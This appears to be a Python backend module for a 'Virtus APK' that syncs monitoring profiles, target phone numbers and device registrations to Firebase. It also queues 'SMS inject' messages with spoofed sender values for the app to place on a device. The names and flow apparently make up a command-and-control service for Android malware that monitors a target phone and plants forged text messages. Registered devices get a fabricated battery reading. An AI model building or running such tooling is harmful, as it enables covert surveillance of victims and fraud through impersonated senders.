import json
import logging
import time
from datetime import datetime, timezone
from urllib.parse import quote

import httpx

from app.config import get_settings
from app.database import Device, MonitorProfile, OutboundSMS
from app.firebase_client import normalize_firebase_url

logger = logging.getLogger(__name__)
settings = get_settings()


def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
    if profile.firebase_url:
        return normalize_firebase_url(profile.firebase_url)
    if profile.license_key and profile.license_key.lower().startswith("http"):
        return normalize_firebase_url(profile.license_key)
    return None


def get_license_key(profile: MonitorProfile) -> str | None:
    if profile.license_key:
        return profile.license_key.strip()
    if profile.firebase_url:
        return normalize_firebase_url(profile.firebase_url)
    return None


def _config_path_key(license_key: str) -> str:
    key = license_key.strip()
    if key.lower().startswith("http"):
        return quote(key, safe="")
    return key.upper()


async def _firebase_put(url: str, data: dict) -> None:
    async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
        response = await client.put(f"{url}.json", json=data)
        response.raise_for_status()


async def push_virtus_config(profile: MonitorProfile, device: Device | None = None) -> None:
    """Push config for Virtus APK: {firebase}/virtus_config.json"""
    firebase_url = get_profile_firebase_url(profile)
    if not firebase_url:
        return

    device_id = device.name if device else ""
    payload = {
        "monitoring": profile.is_monitoring,
        "ts": int(time.time() * 1000),
        "firebase_url": firebase_url,
        "device_id": device_id,
        "firebase_key": "",
        "channel_id": profile.channel_id,
        "target_number": profile.phone_number,
        "sim_index": profile.selected_sim_index or 0,
    }
    await _firebase_put(f"{firebase_url}/virtus_config", payload)

    license_key = get_license_key(profile)
    module_db = settings.virtus_module_db.rstrip("/")
    if license_key and module_db and not license_key.lower().startswith("http"):
        await _firebase_put(f"{module_db}/config/{_config_path_key(license_key)}", payload)


async def push_inject_message(
    firebase_url: str,
    device_id: str,
    sender: str,
    body: str,
) -> str:
    """Queue SMS inject for Virtus APK: {firebase}/messages/{device_id}/{id}."""
    base = normalize_firebase_url(firebase_url)
    message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
    payload = {
        "sender": sender,
        "body": body,
        "injected": False,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/messages/{device_id}/{message_id}", payload)
    return message_id


async def register_device_on_firebase(
    firebase_url: str,
    device: Device,
    profile: MonitorProfile,
) -> None:
    base = normalize_firebase_url(firebase_url)
    meta = {}
    if device.device_meta:
        try:
            meta = json.loads(device.device_meta)
        except json.JSONDecodeError:
            meta = {}

    payload = {
        "name": device.name,
        "phone": device.phone_number,
        "battery": meta.get("battery", "98"),
        "online": True,
        "sim_index": profile.selected_sim_index or 0,
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/devices/{device.name}", payload)


async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | None = None) -> None:
    if not get_profile_firebase_url(profile):
        return
    try:
        await push_virtus_config(profile, device)
        if device:
            firebase_url = get_profile_firebase_url(profile)
            if firebase_url:
                await register_device_on_firebase(firebase_url, device, profile)
    except Exception as exc:
        logger.warning("Firebase profile sync failed: %s", exc)


async def push_outbound_to_firebase(
    profile: MonitorProfile,
    device: Device,
    outbound: OutboundSMS,
) -> str | None:
    """Push channel SMS to Virtus APK inject queue."""
    firebase_url = get_profile_firebase_url(profile)
    if not firebase_url:
        return None

    sender = outbound.spoof_sender or outbound.to_number or "UNKNOWN"
    body = outbound.message
    try:
        return await push_inject_message(firebase_url, device.name, sender, body)
    except Exception as exc:
        logger.warning("Firebase inject push failed: %s", exc)
        return None
